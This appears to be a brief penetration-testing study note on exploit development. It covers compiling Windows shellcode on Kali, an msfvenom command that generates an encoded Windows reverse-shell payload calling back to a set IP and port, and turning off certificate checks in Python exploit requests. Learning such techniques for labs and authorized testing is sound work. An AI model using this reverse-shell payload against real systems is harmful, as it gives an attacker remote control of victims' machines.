# Exploit Dev

### Compiling Shellcode

Use [x86_64-w64-mingw32-gcc](../11%20Windows/5%20Compilation/x86_64-w64-mingw32-gcc.md) to compile Windows programs in kali

Note: If `winsock2.h` is included, you will need to add the option `-lws2_32` to successfully compile

### Generate Shellcode

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

`EXITFUNC=thread` is useful when injecting into a process as without it, closing the shell would end the injected process

The `-b "\x00\x0a\x0d\x25\x26\x2b\x3d"` option should always be included when generating C code to avoid possible issues

### Modify Python Web

If attempting to utilize a web exploit in python against a self signed server (https), we have to modify any requests made to include

```python
verify=False
# So that
response = requests.post(url, data=data, allow_redirects=False)
# Becomes
response = requests.post(url, data=data, allow_redirects=False, verify=False)
```
